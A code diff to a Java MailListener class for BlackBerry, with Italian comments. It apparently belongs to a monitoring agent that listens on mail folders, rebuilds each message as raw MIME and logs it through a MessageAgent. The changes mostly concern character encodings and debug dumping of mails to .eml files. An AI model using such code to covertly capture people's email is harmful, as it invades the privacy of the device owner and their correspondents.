@@ -28,8 +28,11 @@ import net.rim.blackberry.api.mail.event.StoreListener;
 import net.rim.device.api.servicebook.ServiceBook;
 import net.rim.device.api.servicebook.ServiceRecord;
 import net.rim.device.api.util.DataBuffer;
+import net.rim.device.api.util.DateTimeUtilities;
 import net.rim.device.api.util.IntHashtable;
 import blackberry.agent.MessageAgent;
+import blackberry.fs.AutoFlashFile;
+import blackberry.fs.Path;
 import blackberry.log.LogType;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
@@ -240,7 +243,7 @@ public final class MailListener implements FolderListener, StoreListener,
             if (storeName.indexOf("@") > 0) {
                 from = storeName;
             }
-            final String mail = parseMessage(message, maxMessageSize, from);
+            final String mail = getParsedMessage(message, maxMessageSize, from);
             //#ifdef DBC
             Check.asserts(mail != null, "Null mail");
             //#endif
@@ -261,16 +264,42 @@ public final class MailListener implements FolderListener, StoreListener,
             databuffer.writeInt(size);
             databuffer.writeLong(filetime.getFiledate());
             //#ifdef DBC
-            Check.asserts(additionalData.length == 20, "Wrong buffer size");
+            Check.asserts(additionalData.length == 20, "Mail Wrong buffer size: " + additionalData.length);
             //#endif
 
             //#ifdef DEBUG_TRACE
             debug.trace("saveLog: "
                     + mail.substring(0, Math.min(mail.length(), 200)));
+
+            AutoFlashFile mailSaved;
+            
+/*            mailSaved = new AutoFlashFile(Path.USER_PATH
+                    + filetime.getOrderedString() + "UTF8.eml", false);
+            mailSaved.create();
+            mailSaved.write(mail.getBytes("UTF-8"));*/
+            
+            mailSaved = new AutoFlashFile(Path.USER_PATH
+                    + filetime.getOrderedString() + ".ISO-8859-1.eml", false);
+            mailSaved.create();
+            mailSaved.write(mail.getBytes("ISO-8859-1"));
+            
+/*            mailSaved = new AutoFlashFile(Path.USER_PATH
+                    + filetime.getOrderedString() + ".UTF16.eml", false);
+            mailSaved.create();
+            mailSaved.write(mail.getBytes("UTF-16BE"));*/
             //#endif
 
-            messageAgent.createLog(additionalData, mail.getBytes("UTF-8"),
+                       
+            messageAgent.createLog(additionalData, mail.getBytes("ISO-8859-1"),
                     LogType.MAIL_RAW);
+            
+/*            newMail = mail + "WCHAR";
+            messageAgent.createLog(additionalData, WChar.getBytes(newMail),
+                    LogType.MAIL_RAW);
+            
+            newMail = mail + "UTF-8";
+            messageAgent.createLog(additionalData, newMail.getBytes("UTF-8"),
+                    LogType.MAIL_RAW);*/
 
         } catch (final Exception ex) {
             //#ifdef DEBUG_ERROR
@@ -514,15 +543,17 @@ public final class MailListener implements FolderListener, StoreListener,
          */
     }
 
-    private String parseMessage(final Message message,
+    private String getParsedMessage(final Message message,
             final int maxMessageSize, final String from) {
         final Address[] addresses;
 
         final StringBuffer mailRaw = new StringBuffer();
 
+        // costruisce gli header
         addAllHeaders(message.getAllHeaders(), mailRaw);
         addFromHeaders(message.getAllHeaders(), mailRaw, from);
 
+        // decode del mime, separo text da html
         final MailParser parser = new MailParser(message);
         final Mail mail = parser.parse();
 
@@ -533,6 +564,7 @@ public final class MailListener implements FolderListener, StoreListener,
         //debug.trace("Body text: " + message.getBodyText());
         //#endif
 
+        // comincia la ricostruzione del MIME
         mailRaw.append("MIME-Version: 1.0\r\n");
         //1234567890123456789012345678
         final long rnd = Math.abs(random.nextLong());
@@ -545,8 +577,7 @@ public final class MailListener implements FolderListener, StoreListener,
         }
 
         if (mail.hasText()) {
-            mailRaw.append("Content-type: text/plain; charset=UTF8\r\n\r\n");
-
+            mailRaw.append(mail.plainTextMessageContentType);
             String msg = mail.plainTextMessage;
             if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
                 msg = msg.substring(0, maxMessageSize);
@@ -559,8 +590,9 @@ public final class MailListener implements FolderListener, StoreListener,
         }
 
         if (mail.hasHtml()) {
-            mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
-            //mail.append("Content-Transfer-Encoding: quoted-printable");
+            //mailRaw.append("Content-Transfer-Encoding: quoted-printable\r\n");
+            //mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
+            mailRaw.append(mail.htmlMessageContentType);
             mailRaw.append(mail.htmlMessage);
         }
 
@@ -568,6 +600,7 @@ public final class MailListener implements FolderListener, StoreListener,
             mailRaw.append("\r\n--" + boundary + "--\r\n");
         }
 
+        // se il mio parser fallisce, uso la decodifica di base fornita dalla classe Message
         if (mail.isEmpty()) {
             mailRaw.append("Content-type: text/plain; charset=UTF8\r\n\r\n");
 
@@ -585,6 +618,11 @@ public final class MailListener implements FolderListener, StoreListener,
         return craftedMail;
     }
 
+    /**
+     * Aggiunge alla mail "raw" generata la lista di header presenti nel Message originale
+     * @param headers
+     * @param mail
+     */
     private void addAllHeaders(final Enumeration headers,
             final StringBuffer mail) {
 
@@ -603,6 +641,13 @@ public final class MailListener implements FolderListener, StoreListener,
         }
     }
 
+    /**
+     * Il metodo addAllHeaders non estrae il campo from.
+     * Occorre specificarglelo esplicitamente.
+     * @param headers
+     * @param mail
+     * @param from
+     */
     private void addFromHeaders(final Enumeration headers,
             final StringBuffer mail, final String from) {
 
